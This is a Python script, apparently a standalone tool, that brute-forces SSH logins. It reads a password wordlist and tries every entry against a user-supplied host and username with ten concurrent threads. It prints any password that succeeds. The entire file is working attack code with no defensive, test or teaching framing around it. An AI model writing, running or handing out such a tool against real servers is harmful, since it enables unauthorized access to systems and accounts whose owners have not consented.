import paramiko
from termcolor import colored
import concurrent.futures
import os

def ssh_login(hostname, port, username, password):
    # Create an SSH client
    client = paramiko.SSHClient()

    # Automatically add the server's host key (don't do it in production without verifying)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Connect to the SSH server
        client.connect(hostname, port, username, password)
        return True

    except paramiko.AuthenticationException:
        # Failed login attempt
        return False

    finally:
        # Close the SSH connection
        client.close()

def read_password_list(file_path):
    try:
        with open(file_path, 'r') as file:
            password_list = [line.strip() for line in file]
            return password_list
    except FileNotFoundError:
        print(f"File '{file_path}' not found.")
    except PermissionError:
        print(f"Permission denied to access file '{file_path}'.")

def main():
    # SSH connection details
    hostname = input("Enter the hostname: ")
    port = 22
    username = input("Enter the username: ")
    password_list_path = input("Enter the path to the password list file: ")

    # Check if the provided path is relative or absolute
    if not os.path.isabs(password_list_path):
        # Convert the relative path to an absolute path
        password_list_path = os.path.abspath(password_list_path)

    password_list = read_password_list(password_list_path)

    if password_list:
        # Configure the maximum number of concurrent threads
        max_threads = 10

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            # Submit login attempts as concurrent tasks
            futures = [executor.submit(ssh_login, hostname, port, username, password) for password in password_list]

            # Process the results as they complete
            for password, future in zip(password_list, futures):
                if future.result():
                    print(colored(f"Login successful for {username}@{hostname}", 'green'))
                    print(colored(f"Password found: {password}", 'green'))
                    break  # Break out of the loop if successful login

        
    else:
        print("Password not found in the list.")
        print("Failed to read the password list.")

if __name__ == '__main__':
    main()
